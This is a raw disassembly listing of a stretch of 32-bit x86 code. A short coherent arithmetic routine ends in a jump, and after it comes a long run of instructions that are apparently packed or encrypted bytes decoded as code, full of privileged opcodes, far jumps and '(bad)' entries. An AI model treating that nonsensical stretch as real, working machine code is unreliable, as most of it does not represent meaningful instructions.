  4176e2:	mov    eax,DWORD PTR [ebp-0x4]
  4176e5:	mov    esi,DWORD PTR [ebp+0xc]
  4176e8:	xor    esi,ecx
  4176ea:	add    esi,edx
  4176ec:	imul   esi,DWORD PTR [eax]
  4176ef:	mov    DWORD PTR [eax],esi
  4176f1:	jmp    0x4176fb
  4176f6:	mov    esi,DWORD PTR [ebp+0x14]
  4176f9:	xor    DWORD PTR [eax],esi
  4176fb:	mov    eax,DWORD PTR [ebp-0x4]
  4176fe:	mov    esi,DWORD PTR [ebp+0x10]
  417701:	xor    esi,ecx
  417703:	sub    edi,esi
  417705:	add    DWORD PTR [eax],edi
  417707:	mov    eax,DWORD PTR [ebp-0x4]
  41770a:	mov    esi,DWORD PTR [ebp-0x8]
  41770d:	add    esi,DWORD PTR [eax]
  41770f:	mov    DWORD PTR [ebp-0x8],esi
  417712:	mov    eax,DWORD PTR [ebp+0xc]
  417715:	mov    esi,DWORD PTR [ebp+0xc]
  417718:	xor    esi,ecx
  41771a:	xor    eax,ecx
  41771c:	lea    eax,[eax+esi*1+0x64e5f0]
  417723:	mov    esi,DWORD PTR [ebp+0xc]
  417726:	xor    esi,ecx
  417728:	add    esi,edx
  41772a:	imul   eax,esi
  41772d:	mov    esi,DWORD PTR [ebp+0xc]
  417730:	jmp    0x419aea
  417735:	sbb    DWORD PTR [edx+0x3a2c7d2b],ecx
  41773b:	cmp    DWORD PTR [edx],ebx
  41773d:	inc    edi
  41773e:	fst    st(5)
  417740:	inc    ecx
  417741:	test   al,0xa8
  417743:	out    0xc2,al
  417745:	stos   BYTE PTR es:[edi],al
  417746:	mov    ecx,0x9e187b7c
  41774b:	jnp    0x4177c8
  41774d:	shr    al,1
  41774f:	int    0x99
  417751:	jle    0x41775c
  417753:	or     esi,DWORD PTR [eax]
  417755:	dec    ebp
  417756:	mov    ah,BYTE PTR [edi]
  417758:	xchg   esp,eax
  417759:	lahf   
  41775a:	test   DWORD PTR [ebp-0xc],esp
  41775d:	and    edx,ecx
  41775f:	push   ss
  417760:	inc    ebp
  417761:	pop    edx
  417762:	xor    al,BYTE PTR [ebp+0x35]
  417765:	mov    edx,0x174c17aa
  41776a:	iret   
  41776b:	inc    esp
  41776c:	jge    0x4177aa
  41776e:	mov    WORD PTR [ecx],ss
  417770:	push   ds
  417771:	jle    0x41771f
  417773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417774:	repz ja 0x41776c
  417777:	jmp    0x417785
  417779:	stc    
  41777a:	push   edi
  41777b:	dec    esi
  41777c:	jb     0x417798
  41777e:	fucomi st,st(7)
  417780:	out    dx,al
  417781:	icebp  
  417782:	add    DWORD PTR [ecx+ebp*2-0x5e],0xc2717267
  41778a:	or     edx,DWORD PTR [ebp-0x44b7854b]
  417790:	or     BYTE PTR [esi],dl
  417792:	fnstcw WORD PTR [edi-0x4a1059d0]
  417798:	xor    DWORD PTR [edx-0x6f],ecx
  41779b:	push   ss
  41779c:	mov    DWORD PTR [ecx-0x53662b1],edi
  4177a2:	rcr    edx,1
  4177a4:	adc    ecx,DWORD PTR [edi]
  4177a6:	ret    0xa651
  4177a9:	inc    ebp
  4177aa:	and    BYTE PTR [eax+0x77],bh
  4177ad:	xchg   DWORD PTR [ebx-0x72],edx
  4177b0:	ja     0x41779e
  4177b2:	xlat   BYTE PTR ds:[ebx]
  4177b3:	jno    0x417778
  4177b5:	mov    dh,0x5
  4177b7:	pop    edi
  4177b8:	cmp    BYTE PTR [esi],bh
  4177ba:	ja     0x417765
  4177bc:	or     edx,edi
  4177be:	xchg   edx,eax
  4177bf:	jbe    0x417806
  4177c1:	jge    0x4177fb
  4177c3:	add    eax,0x6199fdf9
  4177c8:	les    esp,FWORD PTR ds:0x1ca1284
  4177ce:	daa    
  4177cf:	scas   eax,DWORD PTR es:[edi]
  4177d0:	ins    DWORD PTR es:[edi],dx
  4177d1:	sbb    eax,0x6aa114ed
  4177d6:	cwde   
  4177d7:	adc    al,0x7e
  4177d9:	xchg   edx,eax
  4177da:	adc    al,0xc6
  4177dc:	dec    eax
  4177dd:	and    al,0xea
  4177df:	push   edx
  4177e0:	retf   
  4177e1:	sbb    ch,BYTE PTR [ebp-0xd]
  4177e4:	(bad)  
  4177e6:	xchg   edi,eax
  4177e7:	aaa    
  4177e8:	cmp    BYTE PTR [esi],ah
  4177ea:	pop    DWORD PTR [edx-0x4d]
  4177ed:	sbb    bl,0xb2
  4177f0:	std    
  4177f1:	stos   DWORD PTR es:[edi],eax
  4177f2:	aaa    
  4177f3:	xchg   esi,eax
  4177f4:	pop    es
  4177f5:	jbe    0x4177e7
  4177f7:	inc    esi
  4177f8:	sbb    dh,BYTE PTR [eax]
  4177fa:	imul   esp,DWORD PTR [edx+0x1ea80a07],0x65ea1635
  417804:	outs   dx,DWORD PTR ds:[esi]
  417805:	mov    ds:0xf7abb4b5,eax
  41780a:	push   cs
  41780b:	mov    esp,DWORD PTR [ecx+0x5f]
  41780e:	xor    al,0x9a
  417810:	cs fucom st(2)
  417813:	sub    esp,ecx
  417815:	inc    edx
  417816:	mov    al,0xd0
  417818:	fld    TBYTE PTR ds:0xd1374948
  41781e:	jg     0x41786a
  417820:	loopne 0x4177a8
  417822:	inc    ecx
  417823:	jb     0x417827
  417825:	push   eax
  417826:	jo     0x417800
  417828:	jnp    0x41784f
  41782a:	mov    ds:0x1afcec77,al
  41782f:	and    al,0x4c
  417831:	adc    BYTE PTR [esi+0xa064998],bh
  417837:	xor    BYTE PTR [ebp-0xd],0xf
  41783b:	add    eax,0x302dce33
  417840:	pop    ebp
  417841:	rcl    BYTE PTR [ecx-0x48e8331],cl
  417847:	xor    al,0x56
  417849:	add    esi,DWORD PTR [edi-0x47c1c088]
  41784f:	push   eax
  417850:	mov    BYTE PTR [eax],dh
  417852:	push   ebx
  417853:	mov    edx,0x95cc9235
  417858:	jmp    0x41789a
  41785a:	cmp    DWORD PTR [ebx-0x3a],0x63d904e8
  417861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417862:	cmp    DWORD PTR [esi+0xc2d57ed],esi
  417868:	and    BYTE PTR [edi],al
  41786a:	popf   
  41786b:	inc    ebx
  41786c:	pop    esi
  41786d:	pop    ebp
  41786e:	in     eax,0x55
  417870:	pop    eax
  417871:	mov    ds:0xacc9fd1b,al
  417876:	adc    eax,0x71e98d84
  41787b:	js     0x41782c
  41787d:	shr    ah,1
  41787f:	mov    bl,0x95
  417881:	imul   esp,edx,0xffffffb7
  417884:	ficom  WORD PTR cs:[ebp-0x4a]
  417888:	repnz xchg ecx,eax
  41788a:	stc    
  41788b:	cmp    DWORD PTR [esi+ebx*2],edi
  41788e:	push   esi
  41788f:	rcr    DWORD PTR [ebp-0xa79f1a0],cl
  417895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417896:	or     DWORD PTR [esi+0x514ffd7b],0x4d0e25dc
  4178a0:	rol    DWORD PTR [esp+ebx*1-0x38836d40],cl
  4178a7:	sbb    eax,0x3b867ad5
  4178ac:	popf   
  4178ad:	push   eax
  4178ae:	dec    eax
  4178af:	and    ebp,DWORD PTR [edx+0x3c40dd1a]
  4178b5:	dec    edx
  4178b6:	adc    DWORD PTR [esi+0x774cd801],edi
  4178bc:	js     0x4178d6
  4178be:	mov    cl,0x73
  4178c0:	(bad)  
  4178c1:	sahf   
  4178c2:	adc    ebp,DWORD PTR [eax*2-0x5a02725f]
  4178c9:	mov    ds:0x752aab35,al
  4178ce:	shr    DWORD PTR [esi+0x30],1
  4178d1:	lods   al,BYTE PTR ds:[esi]
  4178d2:	or     DWORD PTR [esi+0x58],ebp
  4178d5:	mov    DWORD PTR [edi],esi
  4178d7:	add    ecx,DWORD PTR [di+0x55]
  4178db:	in     al,0xe9
  4178dd:	into   
  4178de:	xor    al,0x62
  4178e0:	mov    edx,0x9f36097c
  4178e5:	pop    eax
  4178e6:	in     al,dx
  4178e7:	pop    ecx
  4178e8:	jo     0x4178cf
  4178ea:	jge    0x4178c0
  4178ec:	xor    ah,BYTE PTR [edi]
  4178ee:	fsqrt  
  4178f0:	mov    DWORD PTR [esi],esp
  4178f2:	arpl   WORD PTR [eax+0x69fe6eb1],dx
  4178f8:	jmp    0x8f6b:0x6bb8906b
  4178ff:	add    eax,0x695c1a57
  417904:	ja     0x41794b
  417906:	adc    esp,DWORD PTR [esi]
  417908:	sbb    esp,ebx
  41790a:	pusha  
  41790b:	sub    DWORD PTR [ecx+0x1bfc674d],edx
  417911:	xor    DWORD PTR [eax+0x28],ebx
  417914:	stos   BYTE PTR es:[edi],al
  417915:	sbb    ah,BYTE PTR [ebp+0x7b634ee0]
  41791b:	xchg   ebp,eax
  41791c:	bound  eax,QWORD PTR [ebx+0x2dff0702]
  417922:	add    al,BYTE PTR [esi]
  417924:	inc    ebx
  417925:	or     eax,0x5c4d3975
  41792a:	inc    edi
  41792b:	repz hlt 
  41792d:	and    al,0x5
  41792f:	mov    ds:0x128ebf70,al
  417934:	pop    esp
  417935:	popf   
  417936:	cwde   
  417937:	xchg   esp,eax
  417938:	mov    ch,0x7d
  41793a:	dec    edx
  41793b:	dec    edx
  41793c:	addr16 or eax,0xdf2998a9
  417942:	mov    ah,0xf5
  417944:	or     al,BYTE PTR [edi+0x28]
  417947:	fiadd  DWORD PTR [eax-0x59b587ce]
  41794d:	mov    cl,dh
  41794f:	(bad)  
  417950:	dec    edx
  417951:	and    esp,DWORD PTR [eax+edi*4+0x60]
  417955:	cld    
  417956:	(bad)  
  417958:	cli    
  417959:	mov    edi,DWORD PTR [esi+0x6b]
  41795c:	sub    ebx,esp
  41795e:	addr16 je 0x417901
  417961:	mov    bh,0xce
  417963:	mov    ecx,0x46cae0ed
  417968:	lahf   
  417969:	push   ebp
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	sbb    al,0x2e
  41796e:	test   BYTE PTR [ecx],bl
  417970:	mov    esi,es
  417972:	pusha  
  417973:	fcomp  DWORD PTR [esi+eax*4-0x64487712]
  41797a:	div    DWORD PTR [edx-0x51f6f5f4]
  417980:	mov    esp,DWORD PTR [eax]
  417982:	mov    edi,0xeeab3e66
  417987:	iret   
  417988:	out    dx,eax
  417989:	imul   ebp,ebp,0x4a
  41798c:	mov    ecx,0xad76dbef
  417991:	jp     0x417989
  417993:	xor    al,0x6a
  417995:	or     BYTE PTR [esi+0x710d6993],ch
  41799b:	jmp    0x417938
  41799d:	jl     0x417999
  41799f:	or     al,0xa6
  4179a1:	mov    ds:0x63a3810b,eax
  4179a6:	shl    DWORD PTR [ebx],cl
  4179a8:	or     BYTE PTR [ebp+0x21],0x3f
  4179ac:	int    0x14
  4179ae:	sbb    DWORD PTR [ecx-0x14b93ca8],edi
  4179b4:	adc    al,0xd4
  4179b6:	scas   eax,DWORD PTR es:[edi]
  4179b7:	ins    DWORD PTR es:[edi],dx
  4179b8:	mov    al,ds:0xeea035f7
  4179bd:	cmp    BYTE PTR [edi+ebp*4],cl
  4179c0:	cli    
  4179c1:	mov    al,0xcc
  4179c3:	pop    edi
  4179c4:	or     ch,bl
  4179c6:	xor    edi,DWORD PTR [eax+0x3d82ca8c]
  4179cc:	jge    0x4179d3
  4179ce:	iret   
  4179cf:	fcomip st,st(7)
  4179d1:	cwde   
  4179d2:	mov    esp,0x3758f4c2
  4179d7:	retf   0x9e0d
  4179da:	cdq    
  4179db:	inc    edx
  4179dc:	and    BYTE PTR [ecx],ch
  4179de:	test   BYTE PTR [edi-0x57],cl
  4179e1:	mov    ds:0xc7c43ef4,eax
  4179e6:	test   eax,0xbbf41599
  4179eb:	sbb    edi,0xffffffa9
  4179ee:	repnz or ecx,ebx
  4179f1:	popf   
  4179f2:	(bad)  [ebx]
  4179f4:	adc    al,dl
  4179f6:	scas   al,BYTE PTR es:[edi]
  4179f7:	mov    ds:0x63cb071c,al
  4179fc:	fbld   TBYTE PTR [edx-0xc]
  4179ff:	mov    ebx,0x515217db
  417a04:	fdivp  st(3),st
  417a06:	rol    DWORD PTR [di-0x1dbb],cl
  417a0b:	dec    eax
  417a0c:	or     esp,DWORD PTR ds:0xa33c780c
  417a12:	and    eax,0x6f88dc02
  417a17:	xchg   edi,eax
  417a18:	shl    BYTE PTR [edi],0xe7
  417a1b:	cmp    DWORD PTR [ebx],eax
  417a1d:	or     dl,dh
  417a1f:	jo     0x417a05
  417a21:	mov    eax,ds:0xe5d88dc8
  417a26:	push   cs
  417a27:	cmp    BYTE PTR [ecx+0x45],0x72
  417a2b:	aam    0x10
  417a2d:	push   0xe88cb5b2
  417a32:	jo     0x4179fb
  417a34:	in     eax,0xf9
  417a36:	jmp    0x4179ed
  417a38:	mov    ds:0xd794faa6,al
  417a3d:	pop    esi
  417a3e:	push   eax
  417a3f:	adc    ah,ah
  417a41:	dec    ebp
  417a42:	and    eax,0x5005a231
  417a47:	xor    DWORD PTR [ecx-0x30],esp
  417a4a:	add    bl,bl
  417a4c:	mov    cl,bl
  417a4e:	xor    bl,BYTE PTR [ecx+edx*8]
  417a51:	sub    bh,BYTE PTR [ebx+0x3e78656e]
  417a57:	je     0x417a97
  417a59:	or     dh,BYTE PTR [edx-0x65]
  417a5c:	xchg   DWORD PTR ds:0xd71d8f15,eax
  417a62:	mov    edx,0x3bb7998a
  417a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a68:	adc    ah,BYTE PTR gs:[ecx+0x70d5a149]
  417a6f:	add    DWORD PTR [ebp-0x62],0x49519897
  417a76:	loopne 0x417a03
  417a78:	in     eax,dx
  417a79:	mov    eax,0x7ed524d
  417a7e:	xor    eax,0x7b94cf5a
  417a83:	daa    
  417a84:	in     al,dx
  417a85:	cmp    eax,0xe9444100
  417a8a:	inc    esi
  417a8b:	daa    
  417a8c:	fist   WORD PTR [edi]
  417a8e:	jge    0x417a5e
  417a90:	lock sbb edx,DWORD PTR [ebx-0x2ed77a8b]
  417a97:	push   edx
  417a98:	pop    ebp
  417a99:	inc    edx
  417a9a:	dec    ebp
  417a9b:	push   0xffffffcd
  417a9d:	aam    0x91
  417a9f:	and    BYTE PTR [esp+ebx*8-0x1f64d4a],dh
  417aa6:	jg     0x417ae7
  417aa8:	mov    ebp,DWORD PTR [ebp-0x31]
  417aab:	or     eax,0xd7133eb1
  417ab0:	aad    0xab
  417ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ab3:	mov    edi,0xf8b0b1af
  417ab8:	hlt    
  417ab9:	cmp    al,0x16
  417abb:	repz cmp cl,BYTE PTR [edi]
  417abe:	repnz ins BYTE PTR es:[edi],dx
  417ac0:	inc    ebp
  417ac1:	cli    
  417ac2:	cmp    al,0x9e
  417ac4:	jne    0x417a93
  417ac6:	push   eax
  417ac7:	or     eax,0xda18046e
  417acc:	jb     0x417b15
  417ace:	mov    esp,0x96a94faf
  417ad3:	inc    edi
  417ad4:	das    
  417ad5:	aas    
  417ad6:	xchg   esi,eax
  417ad7:	jg     0x417a6c
  417ad9:	pop    edx
  417ada:	ret    0x8b7f
  417add:	jne    0x417b5a
  417adf:	xlat   BYTE PTR ds:[ebx]
  417ae0:	mov    edi,0x598b7e57
  417ae5:	mov    DWORD PTR [ebp+0x7a],ecx
  417ae8:	js     0x417ad6
  417aea:	pop    ss
  417aeb:	mov    eax,0x327f5cd7
  417af0:	mov    esi,0x81ce8e5d
  417af5:	sbb    ebp,edi
  417af7:	ds mov ebp,0xe109fe9c
  417afd:	(bad)  
  417afe:	fstp   DWORD PTR [eax*8+0x4b73c175]
  417b05:	and    al,0x77
  417b07:	pop    eax
  417b08:	jmp    0x568f:0x58164872
  417b0f:	addr16 jo 0x417b6e
  417b12:	(bad)  
  417b13:	dec    esi
  417b14:	dec    ecx
  417b15:	in     eax,0x80
  417b17:	adc    ebp,esi
  417b19:	pop    ss
  417b1a:	cdq    
  417b1b:	or     al,0x7f
  417b1d:	test   ah,ch
  417b1f:	xchg   ebx,eax
  417b20:	or     al,0x3e
  417b22:	bound  ecx,QWORD PTR [edx]
  417b24:	test   eax,0x1c426a7a
  417b29:	jmp    DWORD PTR ds:0x506a469c
  417b2f:	push   ecx
  417b30:	ja     0x417b48
  417b32:	xchg   ebx,eax
  417b33:	aam    0x94
  417b35:	and    DWORD PTR [ebp+0x7e],edi
  417b38:	mov    BYTE PTR [edi-0x52],ch
  417b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b3c:	jae    0x417b96
  417b3e:	popf   
  417b3f:	pop    ds
  417b40:	loope  0x417b05
  417b42:	xchg   ebp,eax
  417b43:	xchg   edi,edx
  417b45:	or     edi,ebp
  417b47:	jge    0x417b0f
  417b49:	pop    edx
  417b4a:	xor    BYTE PTR [eax-0x4a],cl
  417b4d:	mov    esp,DWORD PTR [eax+0x29]
  417b50:	mov    esp,DWORD PTR [edi-0x70]
  417b53:	or     eax,0x9ebf1833
  417b58:	out    dx,al
  417b59:	out    dx,eax
  417b5a:	aad    0xb2
  417b5c:	mov    ds:0xec37f0ae,al
  417b61:	mov    eax,0xa79f6754
  417b66:	inc    ecx
  417b67:	out    0xbe,eax
  417b69:	xchg   ecx,eax
  417b6a:	out    0xcd,al
  417b6c:	push   ebp
  417b6d:	icebp  
  417b6e:	cli    
  417b6f:	mov    edi,0xef9832dd
  417b74:	pop    es
  417b75:	mov    WORD PTR [esi+0x11],cs
  417b78:	fisttp WORD PTR [edx]
  417b7a:	sbb    eax,DWORD PTR [ebp+0x34]
  417b7d:	jmp    FWORD PTR [ebx-0x6b]
  417b80:	adc    DWORD PTR ds:0xa0d8336d,ebx
  417b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b87:	mov    esi,0xfb3856
  417b8c:	rcr    DWORD PTR [eax-0x72],1
  417b8f:	call   0xa67a:0x38faecba
  417b96:	call   0x2b3f4859
  417b9b:	mov    ch,0x5b
  417b9d:	and    DWORD PTR [edi-0x67],esi
  417ba0:	or     ecx,edi
  417ba2:	and    al,0x7c
  417ba4:	or     ch,0x28
  417ba7:	dec    ebx
  417ba8:	mov    al,0x45
  417baa:	aaa    
  417bab:	out    0x4b,al
  417bad:	rcr    DWORD PTR [edi+0x3fcad620],1
  417bb3:	push   cs
  417bb4:	lock out 0x9f,eax
  417bb7:	xchg   DWORD PTR [ecx],esp
  417bb9:	or     ecx,DWORD PTR [ebx-0x53]
  417bbc:	xlat   BYTE PTR ds:[ebx]
  417bbd:	xchg   esi,esi
  417bbf:	(bad)  
  417bc1:	pop    ds
  417bc2:	arpl   WORD PTR [ebp+0x6a5e7bd8],dx
  417bc8:	pop    ss
  417bc9:	mov    al,ds:0xeeda104f
  417bce:	xor    BYTE PTR [eax+ebp*8+0x3f461dea],0x73
  417bd6:	es scas al,BYTE PTR es:[edi]
  417bd8:	daa    
  417bd9:	enter  0x2b53,0x3f
  417bdd:	pop    ebx
  417bde:	inc    eax
  417bdf:	inc    eax
  417be0:	test   eax,0x1c4a4331
  417be5:	es pop esp
  417be7:	rcr    BYTE PTR [ebp-0x4],cl
  417bea:	scas   al,BYTE PTR es:[edi]
  417beb:	fsub   DWORD PTR ds:0x96f5ce2e
  417bf1:	aaa    
  417bf2:	mov    ch,0xf3
  417bf4:	xchg   esp,eax
  417bf5:	pop    es
  417bf6:	loopne 0x417bb0
  417bf8:	mov    bh,0x96
  417bfa:	outs   dx,DWORD PTR ds:[esi]
  417bfb:	cli    
  417bfc:	sub    DWORD PTR [esi+0x26],esp
  417bff:	or     eax,0xb7f4d14b
  417c04:	call   0xc2c228e9
  417c09:	test   dh,bh
  417c0b:	pop    ss
  417c0c:	and    DWORD PTR [ecx+ebx*1],edi
  417c0f:	fs pusha 
  417c11:	pop    ecx
  417c12:	shl    DWORD PTR [ebp-0x28],0xce
  417c16:	xor    DWORD PTR [ebx-0x33a434de],ecx
  417c1c:	scas   al,BYTE PTR es:[edi]
  417c1d:	int    0x2
  417c1f:	xor    al,0x86
  417c21:	cmp    edx,DWORD PTR [ebx]
  417c23:	shl    dh,1
  417c25:	pop    eax
  417c26:	and    eax,0x2eb944a4
  417c2b:	xchg   esp,eax
  417c2c:	aas    
  417c2d:	pushf  
  417c2e:	or     DWORD PTR [ebx+esi*4-0x12],edi
  417c32:	cld    
  417c33:	push   ss
  417c34:	das    
  417c35:	and    DWORD PTR [ebp-0xdf330a1],0xffffffc5
  417c3c:	jne    0x417c7f
  417c3e:	aam    0xf8
  417c40:	mov    ah,0xc4
  417c42:	and    al,0x44
  417c44:	mov    DWORD PTR [ebp-0x7ed3d3c6],ebx
  417c4a:	push   esp
  417c4b:	pop    edi
  417c4c:	sub    al,0xd
  417c4e:	ins    DWORD PTR es:[edi],dx
  417c4f:	stos   DWORD PTR es:[edi],eax
  417c50:	ja     0x417c2c
  417c52:	cmp    al,0xba
  417c54:	test   BYTE PTR [ecx+0x588f06c1],bl
  417c5a:	push   0xa72579a8
  417c5f:	dec    eax
  417c60:	inc    edx
  417c61:	scas   al,BYTE PTR es:[edi]
  417c62:	mov    eax,0x7e7a928b
  417c67:	add    DWORD PTR [ecx+0x2a],ebx
  417c6a:	push   edi
  417c6b:	jne    0x417c87
  417c6d:	mov    edx,0x3d8e4846
  417c72:	enter  0xc2c4,0x8b
  417c76:	sub    DWORD PTR [ecx+edx*2],ebx
  417c79:	les    ebx,FWORD PTR [edx-0x43]
  417c7c:	and    DWORD PTR [esi],edi
  417c7e:	fadd   DWORD PTR [edx]
  417c80:	int    0xd7
  417c82:	not    DWORD PTR [ecx+0x75816c15]
  417c88:	out    0x13,al
  417c8a:	xor    al,0xc5
  417c8c:	cmp    ecx,DWORD PTR ds:0x4af8d5c7
  417c92:	test   al,0x45
  417c94:	lahf   
  417c95:	add    DWORD PTR [esi],edx
  417c97:	call   0xf04821da
  417c9c:	out    0x5a,al
  417c9e:	adc    DWORD PTR [eax],edi
  417ca0:	xor    al,0x1c
  417ca2:	and    al,0x4d
  417ca4:	js     0x417ce3
  417ca6:	daa    
  417ca7:	xchg   esi,eax
  417ca8:	int    0xea
  417caa:	test   dl,al
  417cac:	test   BYTE PTR [eax],ah
  417cae:	shl    DWORD PTR [edx-0x69b5561b],cl
  417cb4:	sbb    ch,BYTE PTR [eax]
  417cb6:	pop    ds
  417cb7:	xor    BYTE PTR [ecx-0x26],ch
  417cba:	aad    0x58
  417cbc:	mov    bh,0xb4
  417cbe:	mov    DWORD PTR [ebx],esp
  417cc0:	push   0x8
  417cc2:	sub    edi,DWORD PTR [esi+0x7078392]
  417cc8:	adc    al,BYTE PTR [ebp-0xcbe9d91]
  417cce:	adc    DWORD PTR [ebx-0x769b6891],esp
  417cd4:	jmp    0x17e8:0x13824bab
  417cdb:	popf   
  417cdc:	xor    esp,ebp
  417cde:	xor    DWORD PTR [ebx],ecx
  417ce0:	ficomp WORD PTR [ebx-0x15]
  417ce3:	sub    DWORD PTR [eax+0x435598fd],ebx
  417ce9:	jo     0x417c98
  417ceb:	sbb    BYTE PTR [ebx-0x5c288a24],cl
  417cf1:	jns    0x417d2e
  417cf3:	(bad)  
  417cf4:	mov    ebp,0x78dfd73
  417cf9:	or     edi,DWORD PTR [ebp+0x68]
  417cfc:	sti    
  417cfd:	xchg   ecx,eax
  417cfe:	fcomp  DWORD PTR [eax-0x5]
  417d01:	aad    0xb5
  417d03:	test   DWORD PTR [edx],0xee010f42
  417d09:	lods   eax,DWORD PTR ds:[esi]
  417d0a:	ja     0x417d83
  417d0c:	lds    esp,FWORD PTR [edx+0x70]
  417d0f:	sbb    BYTE PTR [ebx-0x5f],cl
  417d12:	pop    esp
  417d13:	add    DWORD PTR ds:[ebx-0xd],esi
  417d17:	shr    BYTE PTR [edx-0x50],0xb1
  417d1b:	sahf   
  417d1c:	jg     0x417cf3
  417d1e:	jmp    0x2da5c878
  417d23:	and    ebx,DWORD PTR [ebp-0x20acbc87]
  417d29:	jno    0x417ce2
  417d2b:	xchg   esp,eax
  417d2c:	push   eax
  417d2d:	cmp    edi,DWORD PTR [ebp-0x727d9d69]
  417d33:	cli    
  417d34:	dec    ebp
  417d35:	or     eax,0x4303e411
  417d3a:	lods   al,BYTE PTR ds:[esi]
  417d3b:	call   0xaea1:0xc37d8c0c
  417d42:	fs std 
  417d44:	mov    dl,0x3b
  417d46:	icebp  
  417d47:	nop
  417d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d49:	mov    WORD PTR [edi-0x59612ab1],cs
  417d4f:	int    0x7c
  417d51:	(bad)  
  417d52:	shr    BYTE PTR [edi],cl
  417d54:	ja     0x417dbf
  417d56:	enter  0x3749,0xb1
  417d5a:	sbb    edi,ecx
  417d5c:	mov    esp,0x97b030fb
  417d61:	test   eax,0x8ca41871
  417d66:	shl    BYTE PTR [ebx+0x478cc0c5],cl
  417d6c:	cli    
  417d6d:	pop    edx
  417d6e:	arpl   bp,ax
  417d70:	add    BYTE PTR [ebp-0x6d80cccd],dl
  417d76:	xchg   edi,eax
  417d77:	mov    esi,0x87a4a450
  417d7c:	push   edx
  417d7d:	shl    edx,cl
  417d7f:	mov    dh,0x96
  417d81:	xchg   ebp,eax
  417d82:	push   esi
  417d83:	(bad)  
  417d84:	mov    edi,0xec55dc27
  417d89:	nop
  417d8a:	pop    edx
  417d8b:	pop    edx
  417d8c:	pusha  
  417d8d:	fadd   QWORD PTR [ecx-0xee055f1]
  417d93:	lock je 0x417d22
  417d96:	mov    ebp,0x8b09d17c
  417d9b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417d9d:	jno    0x417d4a
  417d9f:	push   esi
  417da0:	or     dh,BYTE PTR [ecx]
  417da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417da3:	sbb    BYTE PTR [edx+ecx*8-0x23bd74a0],0x33
  417dab:	and    eax,DWORD PTR [ecx+0x2d]
  417dae:	push   edi
  417daf:	adc    ecx,DWORD PTR [esi+0x4]
  417db2:	xchg   ebx,eax
  417db3:	leave  
  417db4:	cmp    BYTE PTR [edx+edx*1-0x35],dh
  417db8:	neg    DWORD PTR [edi]
  417dba:	out    dx,eax
  417dbb:	jae    0x417d7d
  417dbd:	out    0xa6,eax
  417dbf:	inc    edx
  417dc0:	test   al,0x39
  417dc2:	loopne 0x417d7e
  417dc4:	pop    edx
  417dc5:	mov    ebp,0x34d87951
  417dca:	imul   esi,ebx,0x5bbcf97a
  417dd0:	fisttp WORD PTR [ebp-0x5f]
  417dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dd5:	push   cs
  417dd6:	xchg   esi,eax
  417dd7:	sbb    bh,bh
  417dd9:	jge    0x417de8
  417ddb:	stc    
  417ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ddd:	cmc    
  417dde:	sub    al,BYTE PTR [edi*2+0x3c330b3d]
  417de5:	shr    DWORD PTR [ebx],0xa9
  417de8:	pop    ebp
  417de9:	mov    esi,0xce861d6d
  417dee:	ret    0xdf38
  417df1:	test   al,0x7a
  417df3:	aas    
  417df4:	imul   edi,DWORD PTR [edx-0x30],0xffffffd1
  417df8:	fstp   QWORD PTR [ebp+0x33]
  417dfb:	gs leave 
  417dfd:	dec    ecx
  417dfe:	sbb    eax,0x11fbd918
  417e03:	adc    BYTE PTR [edx],ah
  417e05:	test   eax,0x5a5f989f
  417e0a:	lods   al,BYTE PTR ds:[esi]
  417e0b:	daa    
  417e0c:	ret    0xaea6
  417e0f:	push   0x28
  417e11:	neg    DWORD PTR [edx-0x6547f455]
  417e17:	or     al,0x37
  417e19:	in     eax,0x5b
  417e1b:	(bad)  
  417e1c:	mov    esp,0xd26b24e
  417e21:	icebp  
  417e22:	mov    ah,0x6e
  417e24:	(bad)  
  417e25:	push   eax
  417e26:	inc    edx
  417e27:	out    dx,al
  417e28:	popf   
  417e29:	jge    0x417e88
  417e2b:	das    
  417e2c:	push   cs
  417e2d:	mov    edx,0x45590d
  417e32:	pop    ebp
  417e33:	popa   
  417e34:	xchg   BYTE PTR [eax+0x210957c8],ah
  417e3a:	fsub   DWORD PTR [ecx+0x4dd22893]
  417e40:	test   BYTE PTR [ecx+0x60],0x35
  417e44:	jns    0x417e55
  417e46:	add    al,0x38
  417e48:	in     eax,dx
  417e49:	imul   ecx,DWORD PTR [ecx-0x80],0xfffffff1
  417e4d:	out    dx,al
  417e4e:	test   al,0x52
  417e51:	test   DWORD PTR ds:0x7c8c0027,0xa3dbb1a1
  417e5b:	int3   
  417e5c:	lahf   
  417e5d:	push   esp
  417e5e:	call   0x4e1b3f1c
  417e63:	add    bl,BYTE PTR [edi+0x117edfdd]
  417e69:	xor    DWORD PTR [ebx+0x3e],esp
  417e6c:	out    dx,al
  417e6d:	mov    edi,0x67902bb4
  417e72:	pop    edi
  417e73:	pop    edx
  417e74:	sub    dl,BYTE PTR [ebp-0x6e0e9a1c]
  417e7a:	repnz arpl WORD PTR [esi+edx*4-0x641c814d],ax
  417e82:	dec    ebx
  417e83:	add    al,0x54
  417e85:	sti    
  417e86:	cmp    edx,ebx
  417e88:	popf   
  417e89:	repnz xor al,0x47
  417e8c:	scas   al,BYTE PTR es:[edi]
  417e8d:	inc    ebp
  417e8e:	data16 scas al,BYTE PTR es:[edi]
  417e90:	push   es
  417e91:	jae    0x417e56
  417e93:	sub    eax,0xd2f24b31
  417e98:	pushf  
  417e99:	cmp    edi,esi
  417e9b:	mov    cl,0xaf
  417e9d:	push   0xffffffeb
  417e9f:	push   edx
  417ea0:	or     al,0xf4
  417ea2:	mov    ah,0x66
  417ea4:	mov    esp,0x7195c7d9
  417ea9:	pushf  
  417eaa:	imul   eax,ebp,0x13
  417ead:	daa    
  417eae:	ja     0x417f25
